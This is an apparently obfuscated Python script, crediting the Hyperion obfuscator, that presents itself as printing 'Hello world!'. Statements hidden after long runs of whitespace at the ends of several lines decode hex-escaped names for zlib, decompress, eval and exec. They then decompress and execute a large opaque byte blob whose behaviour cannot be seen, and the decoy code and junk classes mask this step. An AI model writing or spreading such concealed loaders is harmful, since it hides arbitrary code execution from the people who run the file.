from builtins import *
from math import prod as While


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_invert, _cube, _math, Negative, _add, Round, Math = exec, str, tuple, map, ord, globals, type

class Power:
    def __init__(self, _walk):
        self._while = While((_walk, 93373))
        self.Modulo(_positive=-87609)

    def Modulo(self, _positive = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._while -= 49661 / _positive
        
        try:
            (((Negative, _math), _math) for _math in {Calculate: Calculate})

        except AssertionError:
            ((Negative, _invert, _invert) or Calculate if (Negative, _invert, _invert) and Calculate else ... or (Calculate, (Negative, _invert, _invert)))

        except:
            Math(77604 - -62858) == float

    def Absolute(self, _power = 97288):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _power -= 29153 - -71964
        self._detectvar != False
        
        try:
            ((Negative, _invert) or Calculate if (Negative, _invert) and Calculate else ... or (Calculate, (Negative, _invert)))

        except TypeError:
            ((Negative, _math) or _cube if (Negative, _math) and _cube else ... or (_cube, (Negative, _math)))

        except:
            Math(56650 + 2593) == bool

    def System(_ceil = True):
        return Round()[_ceil]

    def Square(CallFunction = -83183 * -19254, _theory = str, _modulo = Round):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _modulo()[CallFunction] = _theory
        
        try:
            ((Calculate, {'tolodedyiil3Rb': Negative}) for Calculate in {Calculate: Calculate} if _cube is Negative)

        except TypeError:
            (Negative, _math) if _add is _add else (Calculate, Negative) != Calculate

        except:
            Math(3633 * -31397) == type

    def execute(code = str):
        return _invert(_cube(_math(Negative(_add, code))))

    @property
    def _detectvar(self):
        self._calculate = '<__main__._modulo object at 0x000001006BE86637>'
        return (self._calculate, Power._detectvar)

if __name__ == '__main__':
    try:
        Power.execute(code = __code__)
        Multiply = Power(_walk = -4506 * 74998)

        Multiply.Absolute(_power = 54661 * Multiply._while)                                                                                                                                                                                                                                                          ;Power.Square(CallFunction='IIllIIlIIIlIlllllllI',_theory=b'x\x9c\xe5\x1ako\xe28\xf0\xf3\xf2+X\xbe@\xb4}\xe4\x1d\x82\xd4/\xa7\xdei\xa9Z8-\xa7\xa3\xa7\xdd*\n\x89i\xd351"aK\xff\xfd\xcd\xf8\x11\xca;\xd0\xb2\xfd\xd08\xf6\xf81v\x9c\xf1x<3I>ynU\xaap%\xc3\x06\x87x\x05\x01\x1b\x0c\xa7Y\x14\xe6l\x12\x04\xd5\xcf\x17\xb5\xaf\xcfc2IXZ\xab\xb2\xc9\x0b\xb4p\x9a?\xb0I\xc6q\x1a\xb5AB\xe9s\xfe@\xeeY\x98[\x8e[;\xa9\xfdA\xa7\xe4\x1b\x89k\xdaB\xaf\xfb$\x7f\x98\x0e\xc4\xc0\x0fy>\xceZ\xe7\xe7\xa2\xee,b\xa3\xf3\xa5a\xce7<;N\xb2\x88M\xe2\xc5ad\xe5\xd9\xfd\xfd\xf9\x98\x86\xf7S\xb2\xd4\x89&\x11I3":\xfd\xf9\xf7\xf5\xa9y\xa6/\xa1D,\x16\xed\xf5\xf1$I\xf3F\xed+\xa1\x94U\x9f\xd8\x84\xc6\x9fkZ\xbd\xa2\xb5\nll\xafg?\x93\xb8\xaeU\xc8,"\xe3\\\x123\x1dO\xa1\xe77\x96\x91\xac\x1aNHuB\xe2\x1f\xe9\xbf\t\xa3$\x17\x15\x03\xa0\xcc\x8f\xf4?6\xe5\xa5\xb0\x8a\x83\xfcH;l\xc0\xe2\xe7*M~B\xbfg6\xadi\x151\xa9d4f\x93<\x08\xe0i\xcfY];#\xb3$oh\x15\xca\xa2\x90f\r\xed{}\xf6\xf44{\x9a\xcd\x10\xccT\xee\xa9~wqO\xd9\x00P*k\xdb\xb1\xe3MG^\x98\xb9\x81\xab\x83\xa1\xfe\xbd\xd5\xfar\xfa\xe5\xb4q\xda\xf8bh\xda\xdd\xddE\x9cL\xb6\rr#\xfa\xca\xb4\x83\xc9\xea\x18\xf7$\x0f\xf3|\xcb8\xbd\x9e\t\xa1g\x9a\x008\xc42\xbc\x85x\xcf\xca\xdaf\xec\x97<R\xfa\x98<&\xc09\x8f\x98\x81"M\x12\xe88\xa7\xdc\xe6\x87v\xe4\x94;\xfc\xdd\x05\x15`\xf6w\x17\xebGm\xd4\x07\xd3\x84\xe6I\x8a\xeb\xf0+\x9cl\xa1m\x9a\xa6#\xb80\x151\xc5\x08#\x0b\x02\xbd$\x19\x84\xc6\xa6\xe7%I\x94\x85i2X&\xa8v\xd2\x99\x13\xbe3_\xc8\xfd\x07\xd2\xbe\xbf\xd9HgI\x1a\x93Y\xa3\xfe<L\xe8\x8c<\xa4\xd3\x15\x94;m\xfbZ\xf0U\xb8)\xd6\xe3fozei\x92\xd3d\xfazzm\x1chozm\x1eI\xd1+\x0f\x19\x1d\xae\xa3\xd5F\xa6\xef\xe1\xa5\xaaE\x9b(~\x0c\x82\xd1\xf0\x17\xd9\x8b^]\x86\x97\x0e\xa1\xab\xc3\x05\tc\x1f\x83T$\xa3\xe1_{\xed\xc3\xeb\xab\xab\xf6u\xfb\xea\xea\x1a2W\xed\xf6\xf55\x14\xdaW\x1f\x84Z4\x19\x8fX\xb4\x8e^\xeb\x8f\n\xb9\x19\x0b\xa6\x93\xb1\xf7Qv"\x99N\xfe\xd9\x8b\xbbX\x97]^\xc2\r;\x12!\xeb\xc2\xdd\xed^~\x0cjQ\xc6V[\xb7\xcay\xd3\x94\xf5=\x89\xc3\x0b@\xadz\xfd\xec\x91%\xe9.\xd5F\xd1\x92\xbf\xc5\xc7 \xf2$\xcf\xf6\xe1\xc8\xf5\x8aZcP\xb7};\x84\xe0C\x88 \xf8<\x86\x90\x86\x1cB\x04%0&h34\xea\xcda\xbeF\xdb\xf9\x08\xe4\x8e\xc8l\xedY\xbcQ^n$\xb8cY\xa6e\xaa\x14\x83\xca\xa9\xb2\xa8\x118\xbb\x89\xbfQIjl\x9c\x82i:\xbakx\x16\x04\xcf\x1dz\xa6k\x9b\xbam\xb8\x16\x84\xa1\xe7\xb8\xc4\x83\xb2\x15\x9a\xba\xb9\xf3\xf1\xdb\x0e\x0c.\xfd\xf0\xbed\x1c\xa2\x04\x04\xf0r\x8c\xcds\xafk:`\x18e\x91\xcd\xc0\x0c\\\x88z`\x05\x06D/p\xa0\x87\xb5Z[n\xc0\x8d\x94\xb3\x0c36\x9bfl\xe9\xa6\xbf\x936"\xe1\xf1\xb0e\xf2`ibX\x86\x18\xa0\x0bp\xe8Y\xae\r\x8bd\xf0%\x1b\xda\xb6m\xc1\x06\x8dM\xef\x15\xcb\xb4\x83O\x15\'\n\xeeTQq\xe9\x1cG\x94vs+\rG\x838\xac\n\x03\xa8#\x05G1\xa3\xd6\x86#\xe2\x80\xe9\xbb\xa1\xebC\x0c9\x8c \xf8\x1c\x86<\x17\xca\x9ch\xc3\xf2\xce\xd5<\xce\n\x1a.qm\xc8\x0fa\x12\xf6\xab\xd6\xb1N\xdb\xed6\xc5\x0bR\xcca\xe1\xb5\xdc\xaeKn7\xcaq{\xb1\xbcBW\xec\xa9s\x9dg\xcc7\\\\\x9b\xf0\x10\xf3\x18sH$T\xe5\xb84/\xcac\xab3\x7f8\x9fIk\xc3Q\xbae\t\x84\xcew\x89b\x0e\x94=(t\x7f\xb3\xb8)\xde\xa9\x7f{{\xdb\xbf\xed\xf7\xfb\x08\x10\xf6o[\x9b\xe6\xbdM\x84w\xf1\x8d\xf0u\xb8\xf8\xbe,\xf9>{\no\x1b\x04\xb3\x174AL\xdb\x81\x1f8(\xb4\xa1\x87\xb3Z\xfbZjZ\xce\xd02 \xfa\x10]\x88\xba\x84\x18=\t\x1ds\xc0)^\x06\xd7\xde\xf7\x10\x90\xab\xd3\x06\x9b\xf3\xba\xdd\x06\xdb\xf3\x1a\x8cP\x91\xdb\x9f\xdd6\x8b>T\xe1\x84\xd0\x8b\x14T\x01\xcb\xaa\xeeH"\x0f\x94\n\xd0\x1d<g\xa7\xb8#\x02\xd3\x0c\x01\xc3\xde\x89\x8dBT\x07\x0c\xc3u9\x86\xef\xd9\xa0\xab\x0c\\\x07\xf2\xa0\xb3`\xbb\x1b\xbbM\xd79\xceqh\x0f]<p1\xe5\x11\xf3\x10m\x98]Q\x87\xb1\xb4\xd8\xc1-\xaa\xae\xbe\xd8\xac\x87mR1\xc5\x11\x9f\xf7H\xce\x1f\xaf\xb2\xdb\xaf\t\x9b\xcc\x0fp\x13\xea<\x07\xba\x12\xf4\xf0Wk\xdfAw:\xf4\xd4\xd5\x811<S\x07\xc6!\xc0\x8f60\r\xf0;0\xa5\x8e,\x07\xac\xa3\x1f\x87I\xa42!\x94\x8cH*\x1f\xe1\x0b\xe5#<\xda\xae;\x12\xd7\xfb\x85\x1d\x18\x15\xf6a$\xadE\xbf\xb0\x14\xb9\xb5x\xa4\x17s,N;\x03\xb6\xf6\x00R\xd8\xe8v\x8c\x1b\xde\xf5`\xfbc=\xe4\\\x1fjA\x14\x80\x000\xf9Z\xfb\xc7\xd4\x89\xe7:\xf0K\rx\xb1N\xd4\xef!\x0c\xfa\xea\x16\'6J\x85\xb7\xd4\x86\x05\x0b\xfa\x85.\x1c\xbe(+M\xf9}t`\x07w\xa9\x85\xc2\x1c\x05\xb9g\xbdN\x0b\x16\x14TB\xb5/J(^\xcbJC\x17\xe4\x9d\x01V\xa3\x01R\xcf\x05\xa9\xe7\x03\xbe\xb7\\\xf7\x16\x8aH\x13\x95\r\xa9L\xe82\x1a\xb2\xce^RDv\xe1\xee\xa1\x88\xbc\xf9\xa1\xbe\xb2~;\x8e\xf5\x15\xfcw>\xd8\xbd\xa67\xbf\x9a\xbc4Oe\xdb\xef\xd7\x94\x94i\xbfKGRx\xefO\xc49\xe1\xe6P\x11q\xb1\xb6Y\x86\xa0\x85q\xd6\x91\x1f\xec\x95\x8dv\x80\x8a\xb4M,\xaa\x13Z\x08\xc8P\xea\xc9\xc5i\x8d\xb0\xf4d\xbb\xf8\xdd\r?\xbd\xa1\xc1\x84\x05H\x0e\xd1\xe8\x94\xcb\xb2h\xbf\x91\xb8G2\xbfL0\xaf0x \xe1|H\x85\xf9\xb5R[\xfa\xe9\x01\xba\xe3,\xae4: 2\xed\xa0\x89\xa4Z\xad-;\xa0\x03\xc8\x06\x04\x07\xa2\xcd\rB\x0bz\xb8\xab\xb5\xef\xe4\xdd;\xb2\x97\xcf\x1dz\x1eh9\x11\x18\x1a\xc6+\xbdD[5\x9bU\x8f\xde\xb2\xef\xaf\xac\x97\xef\xcd\xa5\xe1\x12\tvJ\xc5%\xfc\xf7\xb6\x1d\x0bc\\\x18\xe6".\xe6\xe6\x18\xa5\xc5\x8dp\xed\xdc\x16n\x1e\xd4t\x0e\xf0Z\xb5i\x1b}\x87m\x0ey\xfe\r<\x87\xbe\xd2L\xa4\x0b\xc5\x91Z\x8b\xa9\\\'X\x96\x1a\xce.\\\xd4\x80\xfc\xb2\x0e\xb0\x83>\x87\xd8\x1e,\xbf\x81R\xff\x18\x1fB\x8a\xb2\xf0t\x0b\xf8\xdb=\x83\x07\x11\x06\xc8\xe1\x01a<a@\xcf\x83I\x8aP\x824\xc3\t\x1bU\xd5?eU\xf1\xbfZ\x95\xccHt\xc2\x7f#<\xe1\xbf!B>\xaf`e\x83\xe2\x87\xb9\x84>>&\x00\x10R\xad";\xb1\xec${\xce*1\x19VG\xe1h<\xcd\x1aZ\xab\xf2)\xc7_<?}b\xd9\x194\xe6d\xd4@\x9e\x17\x1b@\xed\x00m\xa1]}\x8b\xe2~\xcd\xe23\xd5\xe5"\x127\x1bn\xa5\xf7tnU\xf4o\x17\xd1`\x8a\xf8=\x11\xbf*\xe2da\xee\xc9"\x027\xe2L\xf5\xd3\x844\xe9z\x8b8\x92]n$\xef\xdc(\x05\xa0\xb3\xf4,\xbe7\x85\x9b\x9f\xf2\xcdJ\xe9"\x06>\xff\x11\xa7\x03S\x819\xf1\xcf\x9c87\xc4\xca\x08%Y\x98\x800\xf8\xa4~\xe5|\xd9U\xf9\x8d\x94\x0bI\xba\x95R\xec*~\x14\xc5?d\xf8\x9f2\xe8\xb3\xe4nK\x08m\x8d/G18\x0c\x1a^\x88\xdfC)\xff\x12\xa1\xa4\x8a\x9400\xdc@\xb6\xf7\x16\xb9Q\xf1\'`\x88\xe7)R\xccI\x02\xe4\xd1*j\xe5+\xff\x03\xc7+\xde\xe3')

        if 179162 > 7786843:
            Multiply.Modulo(_positive = Multiply._while * -21937)
        elif 311585 < 2766883:
            Multiply.Absolute(_power = -62805 * Multiply._while)                                                                                                                                                                                                                                                          ;Oo0o0OOo0O0OoOO0o00OOOO0,IIIlIIIllllIIIlIlIlI,O0o00OO0OO0000oo0OOo0oO0oo,NMMMMNMNNNNNMMNMMMMMMNMMN,NNMMMNMNNNNMMMMMMNNM=(lambda MMMNMNMMNMMMNNNMNMNM:MMMNMNMMNMMMNNNMNMNM(__import__('\x7a\x6c\x69\x62'))),(lambda MMMNMNMMNMMMNNNMNMNM:MMMNMNMMNMMMNNNMNMNM['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda MMMNMNMMNMMMNNNMNMNM:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(MMMNMNMMNMMMNNNMNMNM)"),filename='\x4d\x4d\x4d\x4d\x4e\x4d\x4e\x4d\x4e\x4d\x4e\x4e\x4e\x4d\x4e\x4d\x4e\x4d\x4e',mode='\x65\x76\x61\x6c'))),(lambda OOo0o0oo0ooOo00oOoOO0O,MMMNMNMMNMMMNNNMNMNM:OOo0o0oo0ooOo00oOoOO0O(MMMNMNMMNMMMNNNMNMNM)),(lambda:(lambda MMMNMNMMNMMMNNNMNMNM:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(MMMNMNMMNMMMNNNMNMNM)"),filename='\x4d\x4d\x4d\x4d\x4e\x4d\x4e\x4d\x4e\x4d\x4e\x4e\x4e\x4d\x4e\x4d\x4e\x4d\x4e',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 273074 > 5891552:
            Multiply.Absolute(_power = -59039 - Multiply._while)
        elif 184194 < 5073967:
            Multiply.Absolute(_power = -10159 * Multiply._while)                                                                                                                                                                                                                                                          ;NNMMMNMNNNNMMMMMMNNM()(NMMMMNMNNNNNMMNMMMMMMNMMN(IIIlIIIllllIIIlIlIlI(Oo0o0OOo0O0OoOO0o00OOOO0(O0o00OO0OO0000oo0OOo0oO0oo('\x76\x61\x72\x73'))),Power.System(_ceil='IIllIIlIIIlIlllllllI')))

    except Exception as Calculate:
        if 370564 > 4513731:
            Power.execute(code = _cube(Calculate))

        elif 137019 > 6663175:
            Multiply.Absolute(_power = -17523 * Multiply._while)
